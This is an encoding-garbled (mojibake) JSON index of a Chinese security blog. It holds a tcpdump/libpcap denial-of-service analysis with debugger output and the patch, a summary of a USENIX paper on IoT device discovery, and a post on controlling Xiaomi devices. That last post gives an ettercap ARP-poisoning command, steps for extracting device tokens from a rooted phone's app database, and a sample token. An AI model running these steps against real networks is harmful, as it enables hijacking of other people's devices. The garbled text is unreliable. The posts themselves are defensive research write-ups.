å’Œè°ƒè¯•ä¿¡æ¯å¯ä»¥çœ‹åˆ°libpcapåœ¨å¤„ç†ä¸æ­£å¸¸åŒ…æ—¶ä¸ä¸¥è°¨ï¼Œå¯¼è‡´åŒ…çš„å¤´é•¿åº¦hdrlenç«Ÿç„¶å¤§äºæ•è·åŒ…é•¿åº¦caplenï¼Œå¹¶ä¸”åœ¨å¤„ç†æ—¶åˆæ²¡æœ‰ç›¸å…³çš„åˆ¤æ–­ã€‚hdrlenå’Œcaplenéƒ½æ˜¯éè´Ÿæ•´æ•°ï¼Œå¯¼è‡´caplen==0xfffffff3è¿‡é•¿ã€‚ç»§ç»­è·Ÿè¿›hex_and_asciii_print(ndo_default_print) 123456789101112131415161718192021222324252627282930311. void2. hex_and_ascii_print(register const char *ident, register const u_char *cp,3. register u_int length)4. &#123;5. hex_and_ascii_print_with_offset(ident, cp, length, 0);6. &#125;å…¶ä¸­length==0xfffffff3ï¼Œç»§ç»­æ‰§è¡Œ1. void2. hex_print_with_offset(register const char *ident, register const u_char *cp, register u_int length,3. register u_int oset)4. &#123;5. register u_int i, s;6. register int nshorts;7.8. nshorts = (u_int) length / sizeof(u_short);9. i = 0;10. while (--nshorts &gt;= 0) &#123;11. if ((i++ % 8) == 0) &#123;12. (void)printf(&quot;%s0x%04x: &quot;, ident, oset);13. oset += HEXDUMP_BYTES_PER_LINE;14. &#125;15. s = *cp++; &lt;======= æŠ›å‡ºé”™è¯¯ä½ç½®16. (void)printf(&quot; %02x%02x&quot;, s, *cp++);17. &#125;18. if (length &amp; 1) &#123;19. if ((i % 8) == 0)20. (void)printf(&quot;%s0x%04x: &quot;, ident, oset);21. (void)printf(&quot; %02x&quot;, *cp);22. &#125;nshorts=(u_int) length / sizeof(u_short) =&gt; nshorts=0xfffffff3/2=â€­7FFFFFF9â€¬â€¬â€¬â€¬ ä½†æ•°æ®åŒ…æ•°æ®æ²¡æœ‰è¿™ä¹ˆé•¿ï¼Œå¯¼è‡´äº†crashã€‚ å†…å­˜åˆ†æä»”ç»†åˆ†æä¹‹åå‘ç°ï¼Œé€šè¿‡lenåˆ¤æ–­çš„è¿™ä¸ªé•¿åº¦å¹¶æ²¡æœ‰è¿›è¡Œæ§åˆ¶ï¼Œå¦‚æœæ˜¯è‡ªå·±æ„é€ çš„ä¸€ä¸ªè¶…é•¿lençš„æ•°æ®åŒ…ï¼Œåˆ™ä¼šè¿ç»­è¯»å–åˆ°ä¸å¯ä¼°è®¡çš„å€¼ã€‚é€šè¿‡æŸ¥çœ‹epxçš„å€¼æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå†…å­˜åˆ°åº•å¼€è¾Ÿåˆ°ä»€ä¹ˆä½ç½®12341. gdb-peda$ x/10000000x 0x81e33bd2. 0x8203fdd: 0x00000000 0x00000000 0x00000000 0x000000003. 0x8203fed: 0x00000000 0x00000000 0x00000000 0x000000004. 0x8203ffd: Cannot access memory at address 0x8204000 å¯ä»¥çœ‹åˆ°ï¼Œåˆ°è¾¾0x 8204000é™„è¿‘çš„æ—¶å€™ï¼Œå°±æ˜¯æ— æ³•è¯»å–çš„æ— æ•ˆåœ°å€äº†ï¼Œé‚£ä¹ˆåˆå§‹å€¼ä¸º0x 81e33bdï¼Œç”¨ä¸¤ä¸ªå€¼ç›¸å‡ã€‚0x 8204000-0x 81e33bd = 0x 20c40ï¼Œå› ä¸ºebx+ebp*2+0x1ä¸€æ¬¡è¯»å–ä¸¤ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆå¾ªç¯è®¡æ•°å™¨å°±è¦é™¤ä»¥2ï¼Œæœ€åç»“æœä¸º0x 10620ã€‚æ¥çœ‹ä¸€ä¸‹åˆ°è¾¾æ‹’ç»æœåŠ¡ä½ç½®è¯»å–çš„é•¿åº¦ï¼šEBX: 0x81e33bd â€“&gt; 0x0ï¼›EBP: 0x10621ï¼›EBPåˆšå¥½ä¸º10621ã€‚æ­£æ˜¯ä¸å¯è¯»å–å†…å­˜ç©ºé—´çš„åœ°å€ï¼Œå› æ­¤é€ æˆæ‹’ç»æœåŠ¡ã€‚ æ¼æ´æ€»ç»“æ€»ç»“ä¸€ä¸‹æ•´ä¸ªæ¼æ´è§¦å‘è¿‡ç¨‹ï¼Œé¦–å…ˆtcpdumpä¼šè¯»å–æ¶æ„æ„é€ çš„pcapåŒ…ï¼Œåœ¨æ„é€ pcapåŒ…çš„æ—¶å€™ï¼Œè®¾ç½®ä¸€ä¸ªè¶…é•¿çš„æ•°æ®åŒ…é•¿åº¦ï¼Œtcpdumpä¼šæ ¹æ®lençš„é•¿åº¦å»è¯»å–ä¿å­˜åœ¨å†…å­˜ç©ºé—´æ•°æ®åŒ…çš„å†…å®¹ï¼Œå½“å¼•ç”¨åˆ°ä¸å¯è¯»å–å†…å­˜ä½ç½®æ—¶ï¼Œä¼šç”±äºå¼•ç”¨ä¸å¯è¯»æŒ‡é’ˆï¼Œé€ æˆæ‹’ç»æœåŠ¡æ¼æ´ã€‚ æ¼æ´ä¿®è¡¥Libpcapä¾ç„¶æ˜¯aptå®‰è£…çš„é»˜è®¤ç‰ˆæœ¬ï¼Œtcpdumpä½¿ç”¨4.7 .0-bpç‰ˆæœ¬åœ¨hex_and_ascii_print_with_offsetä¸­å¢åŠ å¯¹caplengthçš„åˆ¤æ–­1234567891. caplength = (ndo-&gt;ndo_snapend &gt;= cp) ? ndo-&gt;ndo_snapend - cp : 0;2. if (length &gt; caplength)3. length = caplength;4. nshorts = length / sizeof(u_short);5. i = 0;6. hsp = hexstuff; asp = asciistuff;7. while (--nshorts &gt;= 0) &#123;8. ...9. &#125; å¯ä»¥çœ‹åˆ°æ‰§è¡Œå®Œcaplength = (ndo-&gt;ndo_snapend &gt;= cp) ? ndo-&gt;ndo_snapend - cp : 0;ï¼Œcaplengthä¸º0ï¼Œç»§ç»­æ‰§è¡Œï¼Œå¯ä»¥æ¨å‡ºlengthåŒæ ·ä¸º0ï¼Œåˆ°è¿™é‡Œå·²ç»ä¸ä¼šå‘ç”Ÿé”™è¯¯äº†ã€‚ å‚è€ƒexploit-db payloadWHEREISK0SHLåˆ†æåšå®¢libpcap/tcpdumpæºç ","categories":[{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://cool-y.github.io/categories/äºŒè¿›åˆ¶/"}],"tags":[{"name":"TCPDUMP","slug":"TCPDUMP","permalink":"https://cool-y.github.io/tags/TCPDUMP/"},{"name":"æ‹’ç»æœåŠ¡æ”»å‡»","slug":"æ‹’ç»æœåŠ¡æ”»å‡»","permalink":"https://cool-y.github.io/tags/æ‹’ç»æœåŠ¡æ”»å‡»/"}]},{"title":"åŸºäºé‡‡é›†è§„åˆ™å¼•æ“çš„ç‰©è”ç½‘è®¾å¤‡å‘ç°æ–¹æ³•","slug":"åŸºäºè§„åˆ™å¼•æ“å‘ç°IOTè®¾å¤‡","date":"2018-12-23T03:52:06.000Z","updated":"2021-04-10T13:33:47.037Z","comments":true,"path":"2018/12/23/åŸºäºè§„åˆ™å¼•æ“å‘ç°IOTè®¾å¤‡/","link":"","permalink":"https://cool-y.github.io/2018/12/23/åŸºäºè§„åˆ™å¼•æ“å‘ç°IOTè®¾å¤‡/","excerpt":"","text":"è®ºæ–‡æ¥æºï¼šUSENIX SECURITY 2018ï¼šAcquisitional Rule-based Engine for Discovering Internet-of-Things Devicesä¸‹è½½ï¼šåŸæ–‡pdfä¸­æ–‡slides è®ºæ–‡è§£è¯»æ¦‚è¦ï¼š ç‰©è”ç½‘ï¼ˆIoTï¼‰è®¾å¤‡çš„å¿«é€Ÿå¢é•¿çš„æ ¼å±€ä¸ºå…¶ç®¡ç†å’Œå®‰å…¨æ€§å¸¦æ¥äº†é‡å¤§çš„æŠ€æœ¯æŒ‘æˆ˜ï¼Œå› ä¸ºè¿™äº›ç‰©è”ç½‘è®¾å¤‡æ¥è‡ªä¸åŒçš„è®¾å¤‡ç±»å‹ï¼Œä¾›åº”å•†å’Œäº§å“æ¨¡å‹ã€‚ ç‰©è”ç½‘è®¾å¤‡çš„å‘ç°æ˜¯è¡¨å¾ï¼Œç›‘æ§å’Œä¿æŠ¤è¿™äº›è®¾å¤‡çš„å…ˆå†³æ¡ä»¶ã€‚ç„¶è€Œï¼Œæ‰‹åŠ¨è®¾å¤‡æ³¨é‡Šé˜»ç¢äº†å¤§è§„æ¨¡å‘ç°ï¼Œå¹¶ä¸”åŸºäºæœºå™¨å­¦ä¹ çš„è®¾å¤‡åˆ†ç±»éœ€è¦å…·æœ‰æ ‡ç­¾çš„å¤§å‹è®­ç»ƒæ•°æ®ã€‚å› æ­¤ï¼Œå¤§è§„æ¨¡çš„è‡ªåŠ¨è®¾å¤‡å‘ç°å’Œæ³¨é‡Šä»ç„¶æ˜¯ç‰©è”ç½‘ä¸­çš„ä¸€ä¸ªæ‚¬è€Œæœªå†³çš„é—®é¢˜ã€‚ è¿™ç¯‡æ–‡ç« æå‡ºäº†ä¸€ç§åŸºäºé‡‡é›†è§„åˆ™çš„å¼•æ“ï¼ˆAREï¼‰ï¼Œå®ƒå¯ä»¥è‡ªåŠ¨ç”Ÿæˆç”¨äºåœ¨æ²¡æœ‰ä»»ä½•è®­ç»ƒæ•°æ®çš„æƒ…å†µä¸‹å‘ç°å’Œæ³¨é‡Šç‰©è”ç½‘è®¾å¤‡çš„è§„åˆ™ã€‚AREé€šè¿‡åˆ©ç”¨æ¥è‡ªç‰©è”ç½‘è®¾å¤‡çš„åº”ç”¨å±‚å“åº”æ•°æ®å’Œç›¸å…³ç½‘ç«™ä¸­çš„äº§å“æè¿°æ¥æ„å»ºè®¾å¤‡è§„åˆ™ï¼Œä»¥è¿›è¡Œè®¾å¤‡æ³¨é‡Šã€‚æˆ‘ä»¬å°†äº‹åŠ¡å®šä¹‰ä¸ºå¯¹äº§å“æè¿°çš„å”¯ä¸€å“åº”ä¹‹é—´çš„æ˜ å°„ã€‚ ä¸ºäº†æ”¶é›†äº¤æ˜“é›†ï¼ŒAREæå–å“åº”æ•°æ®ä¸­çš„ç›¸å…³æœ¯è¯­ä½œä¸ºæŠ“å–ç½‘ç«™çš„æœç´¢æŸ¥è¯¢ã€‚AREä½¿ç”¨å…³è”ç®—æ³•ä»¥ï¼ˆç±»å‹ï¼Œä¾›åº”å•†å’Œäº§å“ï¼‰çš„å½¢å¼ç”Ÿæˆç‰©è”ç½‘è®¾å¤‡æ³¨é‡Šçš„è§„åˆ™ã€‚æˆ‘ä»¬è¿›è¡Œå®éªŒå’Œä¸‰ä¸ªåº”ç”¨ç¨‹åºæ¥éªŒè¯AREçš„æœ‰æ•ˆæ€§ã€‚ èƒŒæ™¯ä¸åŠ¨æœºï¼š ç‰©è”ç½‘è“¬å‹ƒå‘å±•ï¼Œé€ å°±äº†ç‰©è”ç½‘è®¾å¤‡çš„å¹¿æ³›åº”ç”¨ï¼Œå®ƒä¸ä»…ç§ç±»ç¹å¤šï¼ŒåŒ…æ‹¬æ‘„åƒå¤´ã€æ‰“å°æœºã€è·¯ç”±å™¨ã€ç”µè§†ç›’å­ã€å·¥æ§ç³»ç»Ÿã€åŒ»ç–—è®¾å¤‡ç­‰ï¼Œè€Œä¸”æ•°é‡åºå¤§ï¼Œæ®ç»Ÿè®¡ï¼Œæ¯å¤©å°±ä¼šæ–°å¢5500000å°ç‰©è”ç½‘è®¾å¤‡ã€‚ ä½†æ˜¯ç”±äºè®¾å¤‡è„†å¼±ã€ç¼ºä¹ç®¡ç†å’Œé…ç½®ä¸å½“ï¼Œç‰©è”ç½‘è®¾å¤‡ç›¸æ¯”ä¼ ç»Ÿè®¡ç®—æœºè¦æ›´ä¸å®‰å…¨ï¼Œæ¯”å¦‚ä¹‹å‰çˆ†å‘çš„Miraiåƒµå°¸ç½‘ç»œï¼Œç»™ç¾å›½é€ æˆäº†é‡å¤§çš„æŸå¤±ã€‚å› æ­¤ï¼Œä¸ºäº†æ›´ä¸»åŠ¨åœ°ä¿æŠ¤IOTè®¾å¤‡ï¼Œæå‰å‘ç°ã€ç™»è®°å’Œæ³¨é‡Šç‰©è”ç½‘è®¾å¤‡æˆä¸ºå…ˆå†³æ¡ä»¶ã€‚ è®¾å¤‡æ³¨é‡Šçš„å†…å®¹é€šå¸¸ä¸ºâ€œè®¾å¤‡ç±»å‹(e.g.,routers) + ä¾›åº”å•†(e.g.,CISCO) + äº§å“å‹å·(e.g.,TV-IP302P)â€ï¼Œä¼ ç»Ÿç”Ÿæˆè®¾å¤‡æ³¨é‡Šçš„æ–¹æ³•æœ‰åŸºäºæŒ‡çº¹çš„ï¼Œä¹Ÿæœ‰ä½¿ç”¨æ ‡å¿—è·å–çš„ï¼Œå‰è€…å¯¹æ•°æ®é›†å’Œå¤§é‡è®¾å¤‡æ¨¡å‹çš„è¦æ±‚å¾ˆé«˜ï¼Œè€Œåè€…éœ€è¦ä¸“ä¸šçŸ¥è¯†çš„äººå·¥æ–¹å¼ï¼Œå› æ­¤ä¸å¯èƒ½ç”¨äºå¤§è§„æ¨¡æ³¨é‡Šè€Œä¸”å¾ˆéš¾å»ç»´æŠ¤æ›´æ–°ã€‚ æ‰€ä»¥ï¼Œä½œè€…å¸Œæœ›æå‡ºä¸€ç§å‡å°‘å¯¹æ•°æ®é›†å’Œäººå·¥ä¾èµ–çš„æ³¨é‡Šæ–¹å¼ã€‚æœ¬æ–‡çš„æ–¹æ³•ä¸»è¦åŸºäºä¸¤ä¸ªäº‹å®ï¼Œç¬¬ä¸€ä¸ªFigure 1æ˜¯åˆ¶é€ å•†é€šå¸¸ä¼šå°†ç›¸å…³ä¿¡æ¯ç¡¬ç¼–ç åˆ°IOTè®¾å¤‡ï¼Œç¬¬äºŒä¸ªFigure 2æ˜¯æœ‰è®¸å¤šç½‘ç«™ï¼ˆå¦‚äº§å“æµ‹è¯„ï¼‰ä¼šæè¿°è®¾å¤‡äº§å“ã€‚ä»ç¬¬ä¸€ä¸ªäº‹å®ï¼Œæˆ‘ä»¬å¯ä»¥ä»åº”ç”¨å±‚æ•°æ®åŒ…è·å–å…³é”®è¯ï¼Œç„¶åæ ¹æ®è¿™äº›å…³é”®è¯ä¾æ®ç¬¬äºŒä¸ªäº‹å®è¿›è¡Œç½‘é¡µçˆ¬è™«ï¼Œä»¥è·å–ç½‘é¡µä¸Šçš„ç›¸å…³æè¿°ï¼Œç„¶åå¯¹è¿™äº›æè¿°è¿›è¡Œè‡ªç„¶è¯­è¨€å¤„ç†å’Œæ•°æ®æŒ–æ˜ï¼Œä»è€Œå»ºç«‹èµ·åŸºäºè§„åˆ™çš„æ˜ å°„ã€‚ æ ¸å¿ƒå·¥ä½œâ€”Rule Minerï¼š Rule Minerç”±ä¸‰ä¸ªéƒ¨åˆ†æ„æˆï¼ŒTransaction setæ˜¯ä¸€å¯¹ç”±åº”ç”¨å±‚æ•°æ®å’Œç›¸å…³ç½‘é¡µç»„æˆçš„æ–‡æœ¬å•å…ƒï¼Œå®ƒç”Ÿæˆäº†ä¸€ç§è§„åˆ™ï¼š ï¼Œå…¶ä¸­Aæ˜¯ä»åº”ç”¨å±‚æ•°æ®åŒ…ä¸­æå–çš„ä¸€äº›ç‰¹å¾ï¼ŒBæ˜¯ä»ç›¸å…³ç½‘é¡µæŠ“å–çš„è®¾å¤‡æè¿°ï¼›Device entity recognitionç»“åˆäº†åŸºäºè¯­æ–™åº“çš„NERå’ŒåŸºäºè§„åˆ™çš„NER(å‘½åå®ä½“è¯†åˆ«)ï¼Œå‰è€…è§£å†³äº†è®¾å¤‡ç±»å‹å’Œä¾›åº”å•†åï¼Œåè€…ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼è¯†åˆ«å‡ºäº§å“å‹å·ã€‚ä½†æ˜¯ç”±äºä¸€ä¸ªä¸ç›¸å¹²çš„ç½‘é¡µä¹Ÿå¯èƒ½åŒ…å«è®¾å¤‡ç±»å‹çš„å…³é”®è¯(å¦‚switch)ï¼Œä»¥åŠä¸€ä¸ªçŸ­è¯­å¯èƒ½å› ä¸ºæ»¡è¶³æ­£åˆ™è¡¨è¾¾å¼è€Œè¢«è®¤ä¸ºæ˜¯å‹å·æ‰€ä»¥è¡¨ç°å¹¶ä¸å¥½ï¼Œä½†å¥½åœ¨å®ä½“ä¸å®ä½“ä¹‹é—´å…·æœ‰å¾ˆé«˜çš„ä¾èµ–æ€§ï¼Œè¿™ä¸‰ä¸ªå…ƒç´ å¸¸å¸¸ä¸€èµ·å‡ºç°ã€‚æ•°æ®æŒ–æ˜ç®—æ³•Apriori algorithmç”¨äºä»Transactionä¸­å­¦ä¹ â€œå…³ç³»â€ã€‚ å®Œæ•´æ¶æ„å’Œåº”ç”¨ å®Œæ•´çš„AREé™¤äº†æ ¸å¿ƒRule Minerä¹‹å¤–ï¼Œè¿˜æœ‰Transaction Collectionç”¨äºæ”¶é›†å“åº”æ•°æ®å’Œç½‘ç»œçˆ¬è™«ï¼ŒRule Libraryç”¨äºå­˜å‚¨ç”Ÿæˆçš„è§„åˆ™ï¼ŒPlannerç”¨äºæ›´æ–°è§„åˆ™ã€‚ä½œè€…ä¸»è¦å°†AREåº”ç”¨äºä¸‰ä¸ªæ–¹é¢ï¼Œä¸€æ˜¯äº’è”ç½‘èŒƒå›´çš„è®¾å¤‡æµ‹é‡ç»Ÿè®¡ï¼ŒäºŒæ˜¯å¯¹å—æŸè®¾å¤‡è¿›è¡Œæ£€æµ‹ï¼Œä¸‰æ˜¯å¯¹æ˜“å—æ”»å‡»çš„è®¾å¤‡è¿›è¡Œåˆ†æã€‚ä¹‹åå¯¹AREçš„æ•ˆæœä¸Nmapè¿›è¡Œæ¯”è¾ƒå’Œè¯„ä¼°ï¼Œä»äº§ç”Ÿè§„åˆ™çš„æ•°é‡ã€è§„åˆ™çš„å‡†ç¡®ç‡å’Œè¦†ç›–ç‡ã€åŠ¨æ€å­¦ä¹ è§„åˆ™çš„èƒ½åŠ›ä»¥åŠæ—¶é—´ä»£ä»·ï¼ŒAREéƒ½è¦ä¼˜äºNmapã€‚ å·¥ä½œæ€»ç»“ï¼š æå‡ºAREçš„æ¡†æ¶ï¼šä¸éœ€è¦æ•°æ®é›†å’Œäººå·¥å¹²é¢„ï¼Œè‡ªåŠ¨ç”Ÿæˆç”¨äºIOTè®¾å¤‡è¯†åˆ«çš„è§„åˆ™ã€‚ å®ç°äº†AREçš„åŸå‹å¹¶è¯„ä¼°äº†å®ƒçš„æ•ˆæœï¼šAREåœ¨ä¸€å‘¨å†…ç”Ÿæˆäº†å¤§é‡çš„è§„åˆ™ï¼Œè€Œä¸”IOTè®¾å¤‡è¯†åˆ«çš„ç»†ç²’åº¦è¶…è¿‡ç°æœ‰å·¥å…·ã€‚ åº”ç”¨äºä¸‰ä¸ªåœºæ™¯ä¸­ï¼Œä¸»è¦å‘ç°æœ‰ï¼šå¤§é‡IOTè®¾å¤‡åœ¨äº’è”ç½‘ä¸­å¯ä»¥æŠµè¾¾ï¼›æˆåƒä¸Šä¸‡çš„IOTè®¾å¤‡æ˜“å—æ”»å‡»ä¸”æš´éœ²ç»™äº†å…¬ä¼—ã€‚","categories":[{"name":"é¡¶ä¼šè®ºæ–‡","slug":"é¡¶ä¼šè®ºæ–‡","permalink":"https://cool-y.github.io/categories/é¡¶ä¼šè®ºæ–‡/"}],"tags":[{"name":"USENIX","slug":"USENIX","permalink":"https://cool-y.github.io/tags/USENIX/"},{"name":"æ•°æ®æŒ–æ˜","slug":"æ•°æ®æŒ–æ˜","permalink":"https://cool-y.github.io/tags/æ•°æ®æŒ–æ˜/"},{"name":"è‡ªç„¶è¯­è¨€å¤„ç†","slug":"è‡ªç„¶è¯­è¨€å¤„ç†","permalink":"https://cool-y.github.io/tags/è‡ªç„¶è¯­è¨€å¤„ç†/"}]},{"title":"åˆ©ç”¨miioæ§åˆ¶å±€åŸŸç½‘å†…çš„å°ç±³æ™ºèƒ½è®¾å¤‡","slug":"miio-control","date":"2018-12-15T06:38:15.000Z","updated":"2021-04-10T13:43:57.848Z","comments":true,"path":"2018/12/15/miio-control/","link":"","permalink":"https://cool-y.github.io/2018/12/15/miio-control/","excerpt":"","text":"æ§åˆ¶å±€åŸŸç½‘å†…çš„IOTè®¾å¤‡ä¸­é—´äººæ”»å‡»â€”æµé‡åˆ†æä½¿ç”¨Nmapåˆ†æå±€åŸŸç½‘å†…è®¾å¤‡ï¼Œå¾—åˆ°æ™ºèƒ½è®¾å¤‡çš„IP å°ç±³æ™ºèƒ½æ’åº§ï¼š192.168.31.197 ç½‘å…³ï¼š192.168.31.147ï¼ˆæ§åˆ¶å®ƒçš„æ‰‹æœºipï¼‰ ettercapå—…æ¢æ™ºèƒ½è®¾å¤‡å’Œç½‘å…³ä¹‹é—´çš„æµé‡sudo ettercap -i ens33 -T -q -M ARP:remote /192.168.31.197// /192.168.31.147// wiresharkæŠ“åŒ…åˆ†æä»å›¾ä¸­å¯ä»¥çœ‹å‡ºï¼Œè®¾å¤‡çš„å‘½ä»¤æ§åˆ¶åŒ…ä¸ºUDPä¼ è¾“ï¼Œæ—¢ç„¶æ˜¯UDPåè®®ä¼ è¾“ï¼Œé‚£ä¹ˆæ˜¯å¦å¯ä»¥é€šè¿‡å‘½ä»¤åŒ…é‡æ”¾æ”»å‡»æ¥å¯¹è®¾å¤‡è¿›è¡Œæ§åˆ¶ï¼Ÿäº†è§£åˆ°åœ¨homeassistantä¸­å¯å®ç°å¯¹å°ç±³è®¾å¤‡çš„é›†æˆï¼Œå¹¶åœ¨å…¶ä¸­å¯¹è®¾å¤‡è¿›è¡Œç®¡ç†å’Œæ“ä½œã€‚Homeassistantï¼Œä¸»è¦ä»¥Pythonè¯­è¨€å¼€å‘ï¼Œæ—¢ç„¶å®ƒèƒ½æ“æ§å°ç±³è®¾å¤‡ï¼Œé‚£å®ƒåº•å±‚è‚¯å®šæœ‰ç›¸å…³çš„å‡½æ•°è°ƒç”¨åº“ã€‚ä¸ºäº†å¯ä»¥æ¶ˆé™¤å¯¹ä¸“æœ‰è½¯ä»¶(ç±³å®¶app)çš„ä¾èµ–ï¼Œå¹¶èƒ½æ§åˆ¶è‡ªå·±çš„è®¾å¤‡ï¼Œæ‰€ä»¥å‡ºç°äº†MiIoã€‚è®¾å¤‡å’Œç±³å®¶appåœ¨åŒä¸€å±€åŸŸç½‘ä¸‹ä½¿ç”¨çš„åŠ å¯†ä¸“æœ‰ç½‘ç»œåè®®æˆ‘ä»¬ç§°ä¹‹ä¸ºMiIoåè®®ã€‚Miioåº“æ”¯æŒçš„è®¾å¤‡æœ‰ï¼š å°ç±³IOTæ§åˆ¶æµç¨‹åœ¨åŒä¸€å±€åŸŸç½‘ä¸­ï¼Œå°ç±³è®¾å¤‡å¯ä»¥ä½¿ç”¨ä¸“æœ‰çš„åŠ å¯†UDPç½‘ç»œåè®®è¿›è¡Œé€šä¿¡æ§åˆ¶ã€‚åœ¨ç½‘ç»œå¯è¾¾çš„å‰æä¸‹ï¼Œå‘å°ç±³è®¾å¤‡å‘é€hello byteså°±å¯ä»¥è·å¾—å«æœ‰tokençš„ç»“æ„ä½“æ•°æ®ã€‚ä¹‹åï¼Œæ„é€ ç›¸åº”çš„ç»“æ„ä½“ï¼Œå¹¶ä¸”ä»¥åŒæ ·çš„æ–¹å¼å‘é€ç»™è®¾å¤‡å³å¯å®Œæˆæ§åˆ¶ã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š è®¾å¤‡Tokençš„è·å–æ–¹å¼å°ç±³è®¾å¤‡çš„tokenè·å–æœ‰ä¸‰ç§é€”å¾„ï¼šmiioè·å–ã€ä»ç±³å®¶appè·å–ã€ä»æ•°æ®åº“è·å– miioè·å–åœ¨ubuntuä¸‹ï¼Œå…ˆå®‰è£…miioï¼Œç„¶åå‘ç°è®¾å¤‡ï¼šnpminstall -g miiomiiodiscoverä½†æ˜¯å¾ˆå¯æƒœï¼Œå¾ˆå¤šè®¾å¤‡éšè—äº†tokenï¼Œä½¿ç”¨è¯¥æ–¹æ³•å¯èƒ½æ— æ³•è·å–åˆ°tokenæˆ–è·å–åˆ°çš„tokenä¸æ­£ç¡®ã€‚ ç±³å®¶appè·å–è¿™ç§æ–¹æ³•éœ€è¦çš„mijia appç‰ˆæœ¬è¾ƒè€ï¼Œä¸”åªå¯¹éƒ¨åˆ†è®¾å¤‡æœ‰æ•ˆã€‚ ä»æ•°æ®åº“è·å–tokenè¿™ç§æ–¹æ³•ä»…åœ¨Mi Home 5.0.19ä¹‹å‰çš„ç‰ˆæœ¬å¯ç”¨ã€‚è¯¥æ–¹æ³•æ˜¯è¯»å–æ‰‹æœºä¸­ç±³å®¶çš„appä¸­çš„æ•°æ®è®°å½•æ¥è·å–è®¾å¤‡çš„tokenï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š å‡†å¤‡ä¸€éƒ¨è·å–rootæƒé™çš„å®‰å“æ‰‹æœº å®‰è£…ç±³å®¶appå¹¶ç™»å½•è´¦å· è¿›å…¥/data/data/com.xiaomi.smarthome/databases/ æ‹·è´dbï¼Œä¸‹è½½åˆ°ç”µè„‘ å‰å¾€ç½‘ç«™ï¼Œä¸Šä¼ dbï¼Œç‚¹å‡»æäº¤ï¼Œå³å¯è·å¾—tokenã€‚ 8894c73cbd5c7224fb4b8a39e360c255 è„šæœ¬æ§åˆ¶IOTè®¾å¤‡é¦–å…ˆéšæ„å‘é€hellobytesè·å¾—æ—¶é—´å’Œè®¾å¤‡IDï¼Œtokenæˆ‘ä»¬è‡ªå·±è®¾ç½®ï¼›ç„¶åæ„é€ å‘é€çš„æ•°æ®ç»“æ„msgï¼Œcmdä¸­çš„methodåŒ…æ‹¬ï¼šset_power(æ§åˆ¶å¼€å…³)ã€get_prop(è·å–çŠ¶æ€)ï¼Œæ§åˆ¶çš„paramsæ˜¯[â€˜onâ€™]/ [â€˜offâ€™]ï¼Œè·å–çŠ¶æ€çš„paramsæ˜¯[â€˜powerâ€™, â€˜temperatureâ€™]å¦‚æœè·å¾—äº†tokenï¼Œå°±èƒ½å¯¹å°ç±³çš„è®¾å¤‡è¿›è¡Œæ“ä½œï¼Œå¦‚å›¾ä¸‹é¢æ˜¯è¿”å›çš„ä¿¡æ¯ã€‚ æ€»ç»“ä»ç›®å‰çš„æ™ºèƒ½å®¶å±…å¸‚åœºæ¥çœ‹ï¼Œç”¨æˆ·ä¸ä¼šåªä½¿ç”¨å•ä¸ªæ™ºèƒ½è®¾å¤‡å‚å•†çš„è®¾å¤‡ï¼Œæ‰€ä»¥å¯¹äºå‚å•†æ¥è¯´ï¼Œé€šè¿‡å¼€æ”¾æ¥å£ç»™ç”¨æˆ·ä¸€äº›å±€åŸŸç½‘çš„æ§åˆ¶â€œè‡ªç”±â€ï¼Œå®ç°ä¸åŒå‚å•†è®¾å¤‡çš„è”åŠ¨æ˜¯ä¸€ä¸ªä¸é”™çš„é€‰æ‹©ã€‚ä»å¦å¤–ä¸€ä¸ªè§’åº¦ï¼Œæœ¬æ–‡ä¸­ä½“ç°çš„å®‰å…¨é—®é¢˜æˆ‘ä»¬ä¹Ÿä¸å®¹å¿½è§†ã€‚å¦‚æœåœ¨å±€åŸŸç½‘ä¸­ä¸ç»è¿‡è®¤è¯å°±èƒ½è·å–ç‰©è”ç½‘è®¾å¤‡çš„è®¿é—®å‡­è¯ï¼Œå¹¶è¿›è€Œè¿›è¡Œæ§åˆ¶ï¼Œæ— å½¢ä¸­ç»™å…¥ä¾µè€…ç•™äº†ä¸€æ‰‡é—¨ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ç»è¿‡æ‰«æäº’è”ç½‘å‘ç°å®¶åº­è·¯ç”±å™¨ï¼Œå¹¶åˆ©ç”¨å¼±å£ä»¤æˆ–è®¾å¤‡æ¼æ´è·å¾—è·¯ç”±å™¨çš„shellæƒé™ï¼Œæ¥ä¸‹æ¥å°±å¯æŒ‰ç…§æ–‡ä¸­æ­¥éª¤å°±å¯ä»¥è·å¾—è®¾å¤‡tokenè¿›è€Œæ§åˆ¶ã€‚å¥½åœ¨å°ç±³å·²ç»åœ¨æœ€æ–°çš„miioç‰ˆæœ¬ä¸­ä¿®å¤äº†è¿™ä¸€æ¼æ´ï¼Œå¤§å¤§æé«˜äº†æ”»å‡»è€…è·å–tokençš„éš¾åº¦ã€‚","categories":[{"name":"IOT","slug":"IOT","permalink":"https://cool-y.github.io/categories/IOT/"}],"tags":[{"name":"å°ç±³","slug":"å°ç±³","permalink":"https://cool-y.github.io/tags/å°ç±³/"},{"name":"miio","slug":"miio","permalink":"https://cool-y.github.io/tags/miio/"},{"name":"ä¸­é—´äºº","slug":"ä¸­é—´äºº","permalink":"https://cool-y.github.io/tags/ä¸­é—´äºº/"},{"name":"é‡æ”¾æ”»å‡»","slug":"é‡æ”¾æ”»å‡»","permalink":"https://cool-y.github.io/tags/é‡æ”¾æ”»å‡»/"}]},{"title":"Hello World","slug":"hello-world","date":"1999-12-31T16:00:00.000Z","updated":"2019-04-15T07:35:38.081Z","comments":true,"path":"2000/01/01/hello-world/","link":"","permalink":"https://cool-y.github.io/2000/01/01/hello-world/","excerpt":"","text":"ä½ 